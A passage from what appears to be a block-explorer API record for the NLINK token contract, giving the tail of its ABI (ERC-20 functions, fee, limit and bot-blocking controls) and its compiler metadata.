"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"automatedMarketMaker\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"botBlockNumber\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"botsCaught\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFeeForDev\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFeeForLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFeeForMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFeeForSwapping\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableTransferDelay\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"earlySniperBuyBlock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"emergencyWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isExcluded\",\"type\":\"bool\"}],\"name\":\"excludeFromMaxTransaction\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"initialBotBuyer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitsInEffect\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"onlyDeleteBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFeeForDev\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFeeForLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFeeForMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFeeForSwapping\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setAutomatedMarketMakerPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLogs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_deadline\",\"type\":\"uint256\"}],\"name\":\"swapTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForDev\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForSwapping\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuyFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSellFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingActive\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract UniswapV2Router\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"devFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"swapFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"updateBuyFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"updateDevWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"updateMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxBuyAmount\",\"type\":\"uint256\"}],\"name\":\"updateMaxBuyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxSellAmount\",\"type\":\"uint256\"}],\"name\":\"updateMaxSellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxWalletAmount\",\"type\":\"uint256\"}],\"name\":\"updateMaxWalletAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"devFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"swapFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"updateSellFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"updateSwapTokensAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"NLINK","CompilerVersion":"v0.8.18+commit.87f61d96","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://693b198f614f4fbaf7a899b86ccfb02e68af5ad99c46cb971f313dd08cafc985"}]}